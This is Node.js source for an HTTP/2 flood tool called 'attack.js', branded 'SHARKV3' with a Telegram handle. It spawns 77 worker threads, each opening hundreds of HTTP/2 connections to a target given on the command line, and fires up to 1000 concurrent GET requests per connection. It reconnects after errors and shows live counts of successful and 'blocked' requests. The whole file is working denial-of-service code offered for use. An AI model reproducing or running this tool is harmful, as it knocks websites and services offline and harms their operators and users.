const http2 = require('http2');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');

const THREADS = 77;
const POWER_MULTIPLIER = 1;
const MAX_INFLIGHT = 1000;
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let maxRps = 0;
let rpsLastSecond = 0;
let end;

function getRandomInRange(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

if (isMainThread) {
    if (process.argv.length < 4) {
        console.error('Usage: node attack.js <target> <duration_secs>');
        process.exit(1);
    }

    const target = process.argv[2];
    const duration = parseInt(process.argv[3]);

    end = Date.now() + duration * 1000;

    console.clear();
    console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
    console.log(`SHARKV3! - NO CPU WARMUP .exx`);

    for (let i = 0; i < THREADS; i++) {
        const connections = getRandomInRange(250, 600);
        new Worker(__filename, { workerData: { target, duration, connections } });
    }

    // Live Stats
    setInterval(() => {
        maxRps = Math.max(maxRps, rpsLastSecond);
        renderStats();
        rpsLastSecond = 0;
    }, LIVE_REFRESH_RATE);

    function renderStats() {
        readline.cursorTo(process.stdout, 0, 0);
        readline.clearScreenDown(process.stdout);

        const timeRemaining = Math.max(0, (end - Date.now()) / 1000);
        const minutes = Math.floor(timeRemaining / 60);
        const seconds = Math.floor(timeRemaining % 60);

        console.log(`SHARKV3 - T.ME/STSVKINGDOM`);
        console.log(`===========================`);
        console.log(`total: ${totalRequests}`);
        console.log(`max-r: ${maxRps}`);
        console.log(`===========================`);
        console.log(`success: ${successCount}`);
        console.log(`blocked: ${errorCount}`);
        console.log(`===========================`);
        console.log(`TIME REMAINING: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`);
    }

    const server = net.createServer(socket => {
        socket.on('data', data => {
            const msg = data.toString();
            if (msg === 'req') totalRequests++, rpsLastSecond++;
            else if (msg === 'ok') successCount++;
            else if (msg === 'err') errorCount++;
        });
    });
    server.listen(9999);

} else {
    const { target, duration, connections } = workerData;
    const endTime = Date.now() + duration * 1000;

    const socket = net.connect(9999, '127.0.0.1');
    const sendStat = msg => socket.write(msg);

    function sendLoop(client, inflight) {
        if (Date.now() > endTime || client.destroyed) return;

        if (inflight.count >= MAX_INFLIGHT) {
            return setTimeout(() => sendLoop(client, inflight), 1);
        }

        inflight.count++;
        let req;

        try {
            req = client.request({ ':method': 'GET', ':path': '/' });
        } catch {
            inflight.count--;
            sendStat('err');
            return;
        }

        req.on('response', () => {
            inflight.count--;
            sendStat('ok');
        });

        req.on('error', () => {
            inflight.count--;
            sendStat('err');
        });

        req.on('close', () => {
            inflight.count--;
        });

        req.end();
        sendStat('req');

        setImmediate(() => sendLoop(client, inflight));
    }

    function createConnection() {
        if (Date.now() > endTime) return;

        let client;
        try {
            client = http2.connect(target);
        } catch {
            return setTimeout(createConnection, 10000);
        }

        const inflight = { count: 0 };

        client.on('error', () => {
            client.destroy();
            setTimeout(createConnection, 30000);
        });

        client.on('goaway', () => client.close());

        client.on('close', () => {
            setTimeout(createConnection, 30000);
        });

        client.on('connect', () => {
            for (let i = 0; i < 10; i++) {
                sendLoop(client, inflight);
            }
        });
    }

    for (let i = 0; i < connections; i++) {
        createConnection();
    }
}
